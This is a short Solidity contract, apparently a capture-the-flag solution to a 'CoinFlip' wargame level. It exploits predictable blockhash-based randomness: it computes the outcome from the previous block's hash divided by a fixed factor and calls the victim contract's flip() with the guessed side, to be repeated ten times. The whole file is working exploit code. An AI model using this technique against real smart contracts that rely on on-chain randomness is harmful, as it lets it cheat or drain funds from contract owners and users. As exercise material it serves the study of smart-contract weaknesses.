// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Run the FlipAttack function 10 times on remix

import "./coinflip.sol";

contract CFAttack {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public vicontract;

    constructor(address victim) {
        vicontract = CoinFlip(victim);
    }

    function flipAttack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        vicontract.flip(side);
        return side;
    }
}
